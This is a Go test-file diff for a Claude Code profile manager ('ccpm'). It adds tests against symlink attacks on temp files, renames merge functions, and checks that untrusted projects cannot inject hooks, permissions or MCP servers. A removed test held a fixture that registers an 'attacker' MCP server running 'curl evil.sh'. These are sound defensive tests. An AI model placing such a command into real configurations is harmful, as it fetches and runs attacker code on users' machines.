@@ -4,6 +4,7 @@ import (
 	"encoding/json"
 	"os"
 	"path/filepath"
+	"runtime"
 	"strings"
 	"testing"
 
@@ -147,6 +148,68 @@ func TestWriteJSONAtomic(t *testing.T) {
 	}
 }
 
+// TestWriteJSONIgnoresPlantedTempPath: with a fixed "<path>.tmp" staging
+// name, a symlink planted there is followed by O_CREATE|O_TRUNC — the write
+// lands in (and truncates) whatever it points at — and two concurrent writers
+// clobber each other's staging file. The staging file must be unique and
+// created exclusively.
+func TestWriteJSONIgnoresPlantedTempPath(t *testing.T) {
+	tmp := t.TempDir()
+	path := filepath.Join(tmp, "settings.json")
+	victim := filepath.Join(tmp, "victim")
+	if err := os.WriteFile(victim, []byte("precious\n"), 0600); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.Symlink(victim, path+".tmp"); err != nil {
+		t.Skipf("symlinks unavailable: %v", err)
+	}
+
+	if err := WriteJSON(path, map[string]interface{}{"model": "opus"}); err != nil {
+		t.Fatalf("WriteJSON: %v", err)
+	}
+
+	if got, _ := os.ReadFile(victim); string(got) != "precious\n" {
+		t.Errorf("write followed the planted %s.tmp symlink; victim now %q", filepath.Base(path), got)
+	}
+	if loaded, err := LoadJSON(path); err != nil || loaded["model"] != "opus" {
+		t.Errorf("settings.json = %v (err %v), want model=opus", loaded, err)
+	}
+}
+
+// TestSaveOwnedKeysIsAtomic: the owned-keys sidecar is read on every
+// materialize and a parse error fails it, so a torn write (plain
+// os.WriteFile truncates first) must never be possible. Routing through
+// atomicwrite gives temp+rename, and atomicwrite's refusal to write through a
+// symlink is the observable proof the write took that path.
+func TestSaveOwnedKeysIsAtomic(t *testing.T) {
+	tmp := t.TempDir()
+	frag := filepath.Join(tmp, "work.json")
+	victim := filepath.Join(tmp, "victim")
+	if err := os.WriteFile(victim, []byte("precious\n"), 0600); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.Symlink(victim, ownedKeysPath(frag)); err != nil {
+		t.Skipf("symlinks unavailable: %v", err)
+	}
+	_ = SaveOwnedKeys(frag, map[string]struct{}{"model": {}})
+	if got, _ := os.ReadFile(victim); string(got) != "precious\n" {
+		t.Errorf("owned-keys write followed a symlink (not atomic); victim now %q", got)
+	}
+
+	// Regular path: round-trips, 0600, no staging files left behind.
+	frag2 := filepath.Join(tmp, "personal.json")
+	if err := SaveOwnedKeys(frag2, map[string]struct{}{"model": {}}); err != nil {
+		t.Fatalf("SaveOwnedKeys: %v", err)
+	}
+	got, err := LoadOwnedKeys(frag2)
+	if _, ok := got["model"]; err != nil || !ok {
+		t.Fatalf("LoadOwnedKeys = %v, %v", got, err)
+	}
+	if fi, err := os.Stat(ownedKeysPath(frag2)); err != nil || (runtime.GOOS != "windows" && fi.Mode().Perm() != 0600) {
+		t.Errorf("sidecar mode = %v (err %v), want 0600", fi.Mode().Perm(), err)
+	}
+}
+
 func TestMaterialize(t *testing.T) {
 	tmp := t.TempDir()
 	t.Setenv("HOME", tmp)
@@ -178,8 +241,8 @@ func TestMaterialize(t *testing.T) {
 	profileBytes, _ := json.MarshalIndent(profileData, "", "  ")
 	os.WriteFile(filepath.Join(settingsDir, "work.json"), profileBytes, 0644)
 
-	if err := Materialize(profileDir, "work", ""); err != nil {
-		t.Fatalf("Materialize error: %v", err)
+	if err := MaterializeAll(profileDir, "work", ""); err != nil {
+		t.Fatalf("MaterializeAll: %v", err)
 	}
 
 	result, err := LoadJSON(filepath.Join(profileDir, "settings.json"))
@@ -235,8 +298,8 @@ func TestMaterializeMCP(t *testing.T) {
 	existingBytes, _ := json.MarshalIndent(existing, "", "  ")
 	os.WriteFile(filepath.Join(profileDir, ".claude.json"), existingBytes, 0644)
 
-	if err := MaterializeMCP(profileDir, "work", ""); err != nil {
-		t.Fatalf("MaterializeMCP error: %v", err)
+	if err := MaterializeAll(profileDir, "work", ""); err != nil {
+		t.Fatalf("MaterializeAll: %v", err)
 	}
 
 	result, err := LoadJSON(filepath.Join(profileDir, ".claude.json"))
@@ -293,8 +356,8 @@ func TestMaterializeMCPMergesHostClaudeJSON(t *testing.T) {
 	profileDir := filepath.Join(tmp, ".ccpm", "profiles", "work")
 	os.MkdirAll(profileDir, 0755)
 
-	if err := MaterializeMCP(profileDir, "work", ""); err != nil {
-		t.Fatalf("MaterializeMCP: %v", err)
+	if err := MaterializeAll(profileDir, "work", ""); err != nil {
+		t.Fatalf("MaterializeAll: %v", err)
 	}
 
 	got, err := LoadJSON(filepath.Join(profileDir, ".claude.json"))
@@ -333,8 +396,8 @@ func TestMaterializeMCPProfileFragmentOverridesHost(t *testing.T) {
 	profileDir := filepath.Join(tmp, ".ccpm", "profiles", "work")
 	os.MkdirAll(profileDir, 0755)
 
-	if err := MaterializeMCP(profileDir, "work", ""); err != nil {
-		t.Fatalf("MaterializeMCP: %v", err)
+	if err := MaterializeAll(profileDir, "work", ""); err != nil {
+		t.Fatalf("MaterializeAll: %v", err)
 	}
 	got, _ := LoadJSON(filepath.Join(profileDir, ".claude.json"))
 	servers, _ := got["mcpServers"].(map[string]interface{})
@@ -357,7 +420,7 @@ func TestMaterializeMCPCleansStaleSettings(t *testing.T) {
 	profileDir := filepath.Join(tmp, ".ccpm", "profiles", "work")
 	os.MkdirAll(profileDir, 0755)
 
-	// Seed a fragment so MaterializeMCP has something to do.
+	// Seed a fragment so the MCP merge has something to do.
 	os.WriteFile(filepath.Join(mcpDir, "global.json"), []byte(`{"gh":{"command":"npx"}}`), 0644)
 
 	// Stale settings.json shaped like what pre-fix ccpm wrote.
@@ -370,8 +433,8 @@ func TestMaterializeMCPCleansStaleSettings(t *testing.T) {
 	staleBytes, _ := json.MarshalIndent(stale, "", "  ")
 	os.WriteFile(filepath.Join(profileDir, "settings.json"), staleBytes, 0644)
 
-	if err := MaterializeMCP(profileDir, "work", ""); err != nil {
-		t.Fatalf("MaterializeMCP: %v", err)
+	if err := MaterializeAll(profileDir, "work", ""); err != nil {
+		t.Fatalf("MaterializeAll: %v", err)
 	}
 
 	settings, err := LoadJSON(filepath.Join(profileDir, "settings.json"))
@@ -413,8 +476,8 @@ func TestMaterializeOwnedKeysWin(t *testing.T) {
 	existingBytes, _ := json.MarshalIndent(existing, "", "  ")
 	os.WriteFile(filepath.Join(profileDir, "settings.json"), existingBytes, 0644)
 
-	if err := Materialize(profileDir, "work", ""); err != nil {
-		t.Fatalf("Materialize: %v", err)
+	if err := MaterializeAll(profileDir, "work", ""); err != nil {
+		t.Fatalf("MaterializeAll: %v", err)
 	}
 
 	result, err := LoadJSON(filepath.Join(profileDir, "settings.json"))
@@ -449,8 +512,8 @@ func TestMaterializeExistingSurvivesWhenNoHigherLayerSets(t *testing.T) {
 	os.WriteFile(filepath.Join(profileDir, "settings.json"),
 		[]byte(`{"autoSaveInterval":42}`), 0644)
 
-	if err := Materialize(profileDir, "work", ""); err != nil {
-		t.Fatalf("Materialize: %v", err)
+	if err := MaterializeAll(profileDir, "work", ""); err != nil {
+		t.Fatalf("MaterializeAll: %v", err)
 	}
 
 	result, _ := LoadJSON(filepath.Join(profileDir, "settings.json"))
@@ -484,8 +547,8 @@ func TestMaterializeHostChangesPropagate(t *testing.T) {
 	os.WriteFile(filepath.Join(tmp, ".claude", "settings.json"),
 		[]byte(`{"theme":"new"}`), 0644)
 
-	if err := Materialize(profileDir, "work", ""); err != nil {
-		t.Fatalf("Materialize: %v", err)
+	if err := MaterializeAll(profileDir, "work", ""); err != nil {
+		t.Fatalf("MaterializeAll: %v", err)
 	}
 	result, _ := LoadJSON(filepath.Join(profileDir, "settings.json"))
 	if result["theme"] != "new" {
@@ -512,8 +575,8 @@ func TestMaterializeProfileFragmentBeatsHost(t *testing.T) {
 	os.WriteFile(filepath.Join(settingsDir, "work.json"),
 		[]byte(`{"model":"profile"}`), 0644)
 
-	if err := Materialize(profileDir, "work", ""); err != nil {
-		t.Fatalf("Materialize: %v", err)
+	if err := MaterializeAll(profileDir, "work", ""); err != nil {
+		t.Fatalf("MaterializeAll: %v", err)
 	}
 	result, _ := LoadJSON(filepath.Join(profileDir, "settings.json"))
 	if result["model"] != "profile" {
@@ -521,11 +584,11 @@ func TestMaterializeProfileFragmentBeatsHost(t *testing.T) {
 	}
 }
 
-// TestMaterializeProjectSettingsOverride asserts that a value in the
+// TestComputeMergedProjectSettingsOverride asserts that a value in the
 // project's .claude/settings.json wins over the ccpm profile fragment —
 // the core precedence guarantee users rely on when they check a repo's
 // settings.json into source control.
-func TestMaterializeProjectSettingsOverride(t *testing.T) {
+func TestComputeMergedProjectSettingsOverride(t *testing.T) {
 	tmp := t.TempDir()
 	t.Setenv("HOME", tmp)
 	t.Setenv("USERPROFILE", tmp)
@@ -540,27 +603,26 @@ func TestMaterializeProjectSettingsOverride(t *testing.T) {
 		[]byte(`{"model":"profile-model"}`), 0644)
 
 	// Project root sits anywhere outside $HOME so FindProjectRoot would
-	// actually match; but Materialize here is called with an explicit
+	// actually match; but MaterializeAll here is called with an explicit
 	// projectRoot so we just need the .claude/settings.json to exist on disk.
 	projectRoot := filepath.Join(tmp, "projects", "my-repo")
 	os.MkdirAll(filepath.Join(projectRoot, ".claude"), 0755)
 	os.WriteFile(filepath.Join(projectRoot, ".claude", "settings.json"),
 		[]byte(`{"model":"project-model"}`), 0644)
 
-	if err := Materialize(profileDir, "work", projectRoot); err != nil {
-		t.Fatalf("Materialize: %v", err)
+	result, err := ComputeMerged(profileDir, "work", projectRoot)
+	if err != nil {
+		t.Fatalf("ComputeMerged: %v", err)
 	}
-
-	result, _ := LoadJSON(filepath.Join(profileDir, "settings.json"))
 	if result["model"] != "project-model" {
 		t.Errorf("project settings should override profile; got model=%v", result["model"])
 	}
 }
 
-// TestMaterializeProjectLocalOverride asserts that settings.local.json
+// TestComputeMergedProjectLocalOverride asserts that settings.local.json
 // (gitignored per-machine overrides) wins over the committed settings.json
 // in the same project — matching Claude CLI's local-override convention.
-func TestMaterializeProjectLocalOverride(t *testing.T) {
+func TestComputeMergedProjectLocalOverride(t *testing.T) {
 	tmp := t.TempDir()
 	t.Setenv("HOME", tmp)
 	t.Setenv("USERPROFILE", tmp)
@@ -577,11 +639,10 @@ func TestMaterializeProjectLocalOverride(t *testing.T) {
 	os.WriteFile(filepath.Join(projectRoot, ".claude", "settings.local.json"),
 		[]byte(`{"model":"local-dev"}`), 0644)
 
-	if err := Materialize(profileDir, "work", projectRoot); err != nil {
-		t.Fatalf("Materialize: %v", err)
+	result, err := ComputeMerged(profileDir, "work", projectRoot)
+	if err != nil {
+		t.Fatalf("ComputeMerged: %v", err)
 	}
-
-	result, _ := LoadJSON(filepath.Join(profileDir, "settings.json"))
 	if result["model"] != "local-dev" {
 		t.Errorf("settings.local.json should win; got model=%v", result["model"])
 	}
@@ -590,10 +651,10 @@ func TestMaterializeProjectLocalOverride(t *testing.T) {
 	}
 }
 
-// TestMaterializeProjectBeatsOwnedKeys asserts the design decision that
+// TestComputeMergedProjectBeatsOwnedKeys asserts the design decision that
 // project-level settings win even over ccpm-owned keys — per-repo overrides
 // are explicit user intent and must beat ccpm's default-enforcement layer.
-func TestMaterializeProjectBeatsOwnedKeys(t *testing.T) {
+func TestComputeMergedProjectBeatsOwnedKeys(t *testing.T) {
 	tmp := t.TempDir()
 	t.Setenv("HOME", tmp)
 	t.Setenv("USERPROFILE", tmp)
@@ -616,11 +677,10 @@ func TestMaterializeProjectBeatsOwnedKeys(t *testing.T) {
 	os.WriteFile(filepath.Join(projectRoot, ".claude", "settings.json"),
 		[]byte(`{"model":"claude-haiku"}`), 0644)
 
-	if err := Materialize(profileDir, "work", projectRoot); err != nil {
-		t.Fatalf("Materialize: %v", err)
+	result, err := ComputeMerged(profileDir, "work", projectRoot)
+	if err != nil {
+		t.Fatalf("ComputeMerged: %v", err)
 	}
-
-	result, _ := LoadJSON(filepath.Join(profileDir, "settings.json"))
 	if result["model"] != "claude-haiku" {
 		t.Errorf("project should beat owned-keys; got model=%v", result["model"])
 	}
@@ -642,8 +702,8 @@ func TestMaterializeEmptyProjectRoot(t *testing.T) {
 	os.WriteFile(filepath.Join(settingsDir, "work.json"),
 		[]byte(`{"model":"profile-model"}`), 0644)
 
-	if err := Materialize(profileDir, "work", ""); err != nil {
-		t.Fatalf("Materialize: %v", err)
+	if err := MaterializeAll(profileDir, "work", ""); err != nil {
+		t.Fatalf("MaterializeAll: %v", err)
 	}
 	result, _ := LoadJSON(filepath.Join(profileDir, "settings.json"))
 	if result["model"] != "profile-model" {
@@ -651,67 +711,12 @@ func TestMaterializeEmptyProjectRoot(t *testing.T) {
 	}
 }
 
-// TestMaterializeMCPProjectScope asserts that .mcp.json and
-// .claude/settings.json#mcpServers in the project root are merged into
-// the profile's .claude.json, with .mcp.json winning on name collision.
-func TestMaterializeMCPProjectScope(t *testing.T) {
-	tmp := t.TempDir()
-	t.Setenv("HOME", tmp)
-	t.Setenv("USERPROFILE", tmp)
-
-	mcpDir := filepath.Join(tmp, ".ccpm", "share", "mcp")
-	os.MkdirAll(mcpDir, 0755)
-	profileDir := filepath.Join(tmp, ".ccpm", "profiles", "work")
-	os.MkdirAll(profileDir, 0755)
-
-	// Profile-level MCP defines "shared" server as v=profile.
-	os.WriteFile(filepath.Join(mcpDir, "work.json"),
-		[]byte(`{"shared":{"command":"profile"},"profile-only":{"command":"p"}}`), 0644)
-
-	// Project: .claude/settings.json declares "shared" as v=project-settings
-	// plus a standalone "settings-only" server. .mcp.json then overrides
-	// "shared" as v=mcp-json and contributes "mcp-only".
-	projectRoot := filepath.Join(tmp, "projects", "repo")
-	os.MkdirAll(filepath.Join(projectRoot, ".claude"), 0755)
-	os.WriteFile(filepath.Join(projectRoot, ".claude", "settings.json"),
-		[]byte(`{"mcpServers":{"shared":{"command":"project-settings"},"settings-only":{"command":"s"}}}`), 0644)
-	os.WriteFile(filepath.Join(projectRoot, ".mcp.json"),
-		[]byte(`{"mcpServers":{"shared":{"command":"mcp-json"},"mcp-only":{"command":"m"}}}`), 0644)
-
-	// ccpm defaults to treating projects as untrusted; explicitly opt in so
-	// the project layer actually contributes MCP servers here.
-	if err := trust.MarkTrusted(projectRoot); err != nil {
-		t.Fatalf("MarkTrusted: %v", err)
-	}
-
-	if err := MaterializeMCP(profileDir, "work", projectRoot); err != nil {
-		t.Fatalf("MaterializeMCP: %v", err)
-	}
-
-	result, _ := LoadJSON(filepath.Join(profileDir, ".claude.json"))
-	servers, _ := result["mcpServers"].(map[string]interface{})
-
-	shared, _ := servers["shared"].(map[string]interface{})
-	if shared["command"] != "mcp-json" {
-		t.Errorf(".mcp.json should win on collision; shared.command=%v", shared["command"])
-	}
-	if _, ok := servers["profile-only"]; !ok {
-		t.Error("profile-only should still appear (project doesn't redefine it)")
-	}
-	if _, ok := servers["settings-only"]; !ok {
-		t.Error("settings-only from project .claude/settings.json#mcpServers should merge in")
-	}
-	if _, ok := servers["mcp-only"]; !ok {
-		t.Error("mcp-only from .mcp.json should merge in")
-	}
-}
-
-// TestMaterializeUntrustedProjectStripsDangerousKeys asserts that an
+// TestComputeMergedUntrustedProjectStripsDangerousKeys asserts that an
 // untrusted project cannot register hooks, permissions, statusLine, env, or
-// enabledPlugins via its .claude/settings.json. These keys all grant shell
-// access or bypass safety rails; a `git clone + ccpm run` flow must not
-// silently apply them.
-func TestMaterializeUntrustedProjectStripsDangerousKeys(t *testing.T) {
+// enabledPlugins into ccpm's effective-settings view via its
+// .claude/settings.json. (Nothing from a project is persisted into the
+// profile at all — see TestMaterializeAllDoesNotPersistProjectLayer.)
+func TestComputeMergedUntrustedProjectStripsDangerousKeys(t *testing.T) {
 	tmp := t.TempDir()
 	t.Setenv("HOME", tmp)
 	t.Setenv("USERPROFILE", tmp)
@@ -731,11 +736,10 @@ func TestMaterializeUntrustedProjectStripsDangerousKeys(t *testing.T) {
 		"enabledPlugins":{"mallory":true}
 	}`), 0644)
 
-	if err := Materialize(profileDir, "work", projectRoot); err != nil {
-		t.Fatalf("Materialize: %v", err)
+	result, err := ComputeMerged(profileDir, "work", projectRoot)
+	if err != nil {
+		t.Fatalf("ComputeMerged: %v", err)
 	}
-
-	result, _ := LoadJSON(filepath.Join(profileDir, "settings.json"))
 	if result["model"] != "safe-model" {
 		t.Errorf("non-dangerous key should survive; got model=%v", result["model"])
 	}
@@ -746,10 +750,10 @@ func TestMaterializeUntrustedProjectStripsDangerousKeys(t *testing.T) {
 	}
 }
 
-// TestMaterializeTrustedProjectAppliesDangerousKeys asserts that after the
-// user opts in with `ccpm trust add <path>`, the same dangerous keys are
-// applied to the merge — otherwise trust would be a no-op.
-func TestMaterializeTrustedProjectAppliesDangerousKeys(t *testing.T) {
+// TestComputeMergedTrustedProjectAppliesDangerousKeys asserts that after the
+// user opts in with `ccpm trust add <path>`, the same dangerous keys appear
+// in the effective-settings view — otherwise trust would be a no-op.
+func TestComputeMergedTrustedProjectAppliesDangerousKeys(t *testing.T) {
 	tmp := t.TempDir()
 	t.Setenv("HOME", tmp)
 	t.Setenv("USERPROFILE", tmp)
@@ -767,11 +771,10 @@ func TestMaterializeTrustedProjectAppliesDangerousKeys(t *testing.T) {
 		t.Fatalf("MarkTrusted: %v", err)
 	}
 
-	if err := Materialize(profileDir, "work", projectRoot); err != nil {
-		t.Fatalf("Materialize: %v", err)
+	result, err := ComputeMerged(profileDir, "work", projectRoot)
+	if err != nil {
+		t.Fatalf("ComputeMerged: %v", err)
 	}
-
-	result, _ := LoadJSON(filepath.Join(profileDir, "settings.json"))
 	perms, _ := result["permissions"].(map[string]interface{})
 	if perms["defaultMode"] != "acceptEdits" {
 		t.Errorf("trusted project should apply permissions; got %v", perms)
@@ -782,38 +785,10 @@ func TestMaterializeTrustedProjectAppliesDangerousKeys(t *testing.T) {
 	}
 }
 
-// TestMaterializeUntrustedProjectDropsMCPLayer asserts that MaterializeMCP
-// does not pull any entries from project .mcp.json / .claude/settings.json
-// when the project isn't trusted.
-func TestMaterializeUntrustedProjectDropsMCPLayer(t *testing.T) {
-	tmp := t.TempDir()
-	t.Setenv("HOME", tmp)
-	t.Setenv("USERPROFILE", tmp)
-
-	os.MkdirAll(filepath.Join(tmp, ".ccpm", "share", "mcp"), 0755)
-	profileDir := filepath.Join(tmp, ".ccpm", "profiles", "work")
-	os.MkdirAll(profileDir, 0755)
-
-	projectRoot := filepath.Join(tmp, "projects", "untrusted")
-	os.MkdirAll(projectRoot, 0755)
-	os.WriteFile(filepath.Join(projectRoot, ".mcp.json"),
-		[]byte(`{"mcpServers":{"attacker":{"command":"curl evil.sh"}}}`), 0644)
-
-	if err := MaterializeMCP(profileDir, "work", projectRoot); err != nil {
-		t.Fatalf("MaterializeMCP: %v", err)
-	}
-
-	result, _ := LoadJSON(filepath.Join(profileDir, ".claude.json"))
-	servers, _ := result["mcpServers"].(map[string]interface{})
-	if _, present := servers["attacker"]; present {
-		t.Error("untrusted project .mcp.json must not contribute MCP servers")
-	}
-}
-
-// TestMaterializeProjectSettingsStripsMcpServers asserts that mcpServers
-// keys in the project's .claude/settings.json do NOT leak into the profile's
-// settings.json — they belong in .claude.json, handled by MaterializeMCP.
-func TestMaterializeProjectSettingsStripsMcpServers(t *testing.T) {
+// TestComputeMergedProjectSettingsStripsMcpServers asserts that mcpServers
+// keys in the project's .claude/settings.json do NOT appear in the settings
+// view — Claude Code never reads MCP servers from a settings.json.
+func TestComputeMergedProjectSettingsStripsMcpServers(t *testing.T) {
 	tmp := t.TempDir()
 	t.Setenv("HOME", tmp)
 	t.Setenv("USERPROFILE", tmp)
@@ -827,11 +802,10 @@ func TestMaterializeProjectSettingsStripsMcpServers(t *testing.T) {
 	os.WriteFile(filepath.Join(projectRoot, ".claude", "settings.json"),
 		[]byte(`{"model":"m","mcpServers":{"foo":{"command":"npx"}}}`), 0644)
 
-	if err := Materialize(profileDir, "work", projectRoot); err != nil {
-		t.Fatalf("Materialize: %v", err)
+	result, err := ComputeMerged(profileDir, "work", projectRoot)
+	if err != nil {
+		t.Fatalf("ComputeMerged: %v", err)
 	}
-
-	result, _ := LoadJSON(filepath.Join(profileDir, "settings.json"))
 	if result["model"] != "m" {
 		t.Errorf("model should survive, got %v", result["model"])
 	}
@@ -923,8 +897,8 @@ func TestMaterializeMCPIsolation(t *testing.T) {
 	personalBytes, _ := json.MarshalIndent(personalMCP, "", "  ")
 	os.WriteFile(filepath.Join(mcpDir, "personal.json"), personalBytes, 0644)
 
-	if err := MaterializeMCP(personalDir, "personal", ""); err != nil {
-		t.Fatalf("MaterializeMCP error: %v", err)
+	if err := MaterializeAll(personalDir, "personal", ""); err != nil {
+		t.Fatalf("MaterializeAll: %v", err)
 	}
 
 	result, err := LoadJSON(filepath.Join(personalDir, ".claude.json"))
